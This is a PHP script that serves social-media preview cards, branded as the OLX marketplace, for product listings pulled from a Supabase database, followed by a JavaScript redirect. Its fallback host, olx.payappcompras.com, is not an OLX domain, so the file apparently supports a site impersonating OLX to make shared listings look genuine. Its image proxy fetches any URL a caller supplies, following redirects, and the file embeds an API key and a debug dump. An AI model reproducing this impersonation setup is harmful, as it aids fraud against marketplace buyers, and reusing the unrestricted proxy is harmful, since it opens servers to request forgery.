<?php
/**
 * OG Tags Server - serve preview cards to WhatsApp/Facebook/Telegram bots.
 * Também funciona como proxy de imagem (?img=URL) para garantir que a prévia
 * do Facebook/Meta sempre carregue a foto do produto — independente do domínio
 * onde o site esteja hospedado.
 */

// ---------- MODO PROXY DE IMAGEM ----------
// Uso: /og.php?img=<url-encoded-image-url>
// Serve a imagem a partir do próprio domínio, com headers estáveis (Content-Type,
// Content-Length, Cache-Control). Isso evita que o Facebook rejeite imagens
// vindas de terceiros por CORS, redirects, cabeçalhos faltando, etc.
if (isset($_GET['img'])) {
    $imgUrl = $_GET['img'];
    if (!preg_match('#^https?://#i', $imgUrl)) {
        http_response_code(400);
        exit('bad image');
    }
    $ch = curl_init($imgUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; OGImageProxy/1.0)',
    ]);
    $data = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);
    if ($code !== 200 || !$data) {
        http_response_code(502);
        exit('upstream error');
    }
    if (!$type || stripos($type, 'image/') !== 0) {
        $type = 'image/jpeg';
    }
    header('Content-Type: ' . $type);
    header('Content-Length: ' . strlen($data));
    header('Cache-Control: public, max-age=604800, immutable');
    header_remove('X-Robots-Tag');
    echo $data;
    exit;
}

$debug = isset($_GET['debug']);
$slug = isset($_GET['slug']) ? trim($_GET['slug'], '/') : '';

if ($slug === '') {
    http_response_code(400);
    echo 'Slug required';
    exit;
}

$supabaseUrl = 'https://xoqgxbkbfdwcqeflrusl.supabase.co';
$supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhvcWd4YmtiZmR3Y3FlZmxydXNsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUyOTEwNjEsImV4cCI6MjEwMDg2NzA2MX0.3MPGTF55-jnTu5njYiyfZYan9T1qF_XYRP7b1VlpuBo';

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'] ?? 'olx.payappcompras.com';
$siteUrl = $protocol . '://' . $host;

function sb_get($url, $key, $debug) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'apikey: ' . $key,
        'Authorization: Bearer ' . $key,
        'Accept: application/json',
    ]);
    $res = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($debug) echo "GET $url -> ($code) $res<br>";
    $json = json_decode($res, true);
    return is_array($json) ? $json : [];
}

// Ignora sub-rotas como /slug-1/vendedor
$slugPath = explode('/', $slug);
$fullSlug = $slugPath[0];

$select = 'select=name,description,price,image1_url,slug,display_id';
$product = null;

// 1) slug-displayId
if (preg_match('/^(.+)-(\d+)$/', $fullSlug, $m)) {
    $rows = sb_get(
        $supabaseUrl . '/rest/v1/products?slug=eq.' . rawurlencode($m[1]) . '&display_id=eq.' . (int)$m[2] . '&' . $select . '&limit=1',
        $supabaseKey,
        $debug
    );
    if (!empty($rows)) $product = $rows[0];
}

// 2) slug exato
if (!$product) {
    $rows = sb_get(
        $supabaseUrl . '/rest/v1/products?slug=eq.' . rawurlencode($fullSlug) . '&' . $select . '&limit=1',
        $supabaseKey,
        $debug
    );
    if (!empty($rows)) $product = $rows[0];
}

// 3) slug base (sem sufixo -numero)
if (!$product) {
    $base = preg_replace('/-\d+$/', '', $fullSlug);
    if ($base && $base !== $fullSlug) {
        $rows = sb_get(
            $supabaseUrl . '/rest/v1/products?slug=eq.' . rawurlencode($base) . '&' . $select . '&limit=1',
            $supabaseKey,
            $debug
        );
        if (!empty($rows)) $product = $rows[0];
    }
}

$canonicalUrl = $siteUrl . '/' . $slug;

// Descobre dimensões reais da imagem (Facebook exige >=200x200 e recomenda 1200x630).
function image_dimensions($url) {
    $ctx = stream_context_create(['http' => ['timeout' => 5, 'user_agent' => 'Mozilla/5.0']]);
    $data = @file_get_contents($url, false, $ctx, 0, 262144);
    if (!$data) return [1200, 630];
    $info = @getimagesizefromstring($data);
    if (!$info) return [1200, 630];
    return [$info[0], $info[1]];
}

if (!$product) {
    if ($debug) { echo 'Product not found'; exit; }
    $title = 'OLX';
    $description = 'Confira este anúncio na OLX';
    $rawImage = $siteUrl . '/favicon.png';
} else {
    if ($debug) { echo '<pre>' . print_r($product, true) . '</pre>'; exit; }
    $title = htmlspecialchars($product['name'] . ' - R$ ' . number_format((float)$product['price'], 2, ',', '.'), ENT_QUOTES, 'UTF-8');
    $rawDesc = $product['description'] ?? 'Confira este produto na OLX';
    $description = htmlspecialchars(mb_substr(trim(preg_replace('/\s+/', ' ', $rawDesc)), 0, 160), ENT_QUOTES, 'UTF-8');
    $imageRaw = $product['image1_url'] ?? '';
    if (!empty($imageRaw) && preg_match('/^https?:\/\//i', $imageRaw)) {
        $rawImage = $imageRaw;
    } else if (!empty($imageRaw)) {
        $rawImage = rtrim($siteUrl, '/') . '/' . ltrim($imageRaw, '/');
    } else {
        $rawImage = $siteUrl . '/favicon.png';
    }
}

// Serve a imagem sempre pelo próprio domínio (proxy) — assim o Facebook nunca
// depende de headers/CORS do bucket Supabase e a prévia aparece em qualquer
// domínio onde o site esteja hospedado.
$image = $siteUrl . '/og.php?img=' . rawurlencode($rawImage);
[$imgW, $imgH] = image_dimensions($rawImage);
$imgType = 'image/jpeg';
if (preg_match('/\.png(\?|$)/i', $rawImage)) $imgType = 'image/png';
else if (preg_match('/\.webp(\?|$)/i', $rawImage)) $imgType = 'image/webp';
else if (preg_match('/\.gif(\?|$)/i', $rawImage)) $imgType = 'image/gif';

header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: public, max-age=300');
header_remove('X-Robots-Tag');

?><!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><?php echo $title; ?></title>
  <meta name="description" content="<?php echo $description; ?>">

  <!-- Open Graph / Facebook / WhatsApp / Messenger -->
  <meta property="og:type" content="product">
  <meta property="og:url" content="<?php echo htmlspecialchars($canonicalUrl, ENT_QUOTES, 'UTF-8'); ?>">
  <meta property="og:title" content="<?php echo $title; ?>">
  <meta property="og:description" content="<?php echo $description; ?>">
  <meta property="og:image" content="<?php echo htmlspecialchars($image, ENT_QUOTES, 'UTF-8'); ?>">
  <meta property="og:image:secure_url" content="<?php echo htmlspecialchars($image, ENT_QUOTES, 'UTF-8'); ?>">
  <meta property="og:image:type" content="<?php echo $imgType; ?>">
  <meta property="og:image:width" content="<?php echo (int)$imgW; ?>">
  <meta property="og:image:height" content="<?php echo (int)$imgH; ?>">
  <meta property="og:image:alt" content="<?php echo $title; ?>">
  <meta property="og:site_name" content="OLX">
  <meta property="og:locale" content="pt_BR">

  <!-- Facebook exige fb:app_id ausente ok, mas ajuda ter -->
  <meta property="fb:app_id" content="966242223397117">

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:url" content="<?php echo htmlspecialchars($canonicalUrl, ENT_QUOTES, 'UTF-8'); ?>">
  <meta name="twitter:title" content="<?php echo $title; ?>">
  <meta name="twitter:description" content="<?php echo $description; ?>">
  <meta name="twitter:image" content="<?php echo htmlspecialchars($image, ENT_QUOTES, 'UTF-8'); ?>">

  <link rel="canonical" href="<?php echo htmlspecialchars($canonicalUrl, ENT_QUOTES, 'UTF-8'); ?>">

  <script>window.location.replace("<?php echo htmlspecialchars($canonicalUrl, ENT_QUOTES, 'UTF-8'); ?>");</script>
</head>
<body>
  <p><a href="<?php echo htmlspecialchars($canonicalUrl, ENT_QUOTES, 'UTF-8'); ?>"><?php echo $title; ?></a></p>
</body>
</html>
